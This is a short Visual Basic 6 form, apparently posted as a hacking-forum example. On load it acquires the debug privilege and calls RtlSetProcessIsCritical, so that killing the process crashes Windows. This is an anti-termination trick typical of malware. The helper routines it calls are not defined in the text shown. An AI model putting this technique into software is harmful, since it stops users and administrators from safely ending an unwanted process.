VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   4005
   ClientLeft      =   120
   ClientTop       =   420
   ClientWidth     =   5295
   LinkTopic       =   "Form1"
   ScaleHeight     =   4005
   ScaleWidth      =   5295
   StartUpPosition =   3  'Windows-Standard
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'--------------------------------------------------------
'Example by: Slayer616
'Originally Coded by: Unknown
'Thanks to: All Friends/All Members of HH/SCz
'--------------------------------------------------------
Private Sub Form_Load()
On Error Resume Next
GetPrivilegs SE_DEBUG_NAME
Call RtlSetProcessIsCritical(0, 0, 1)
End Sub
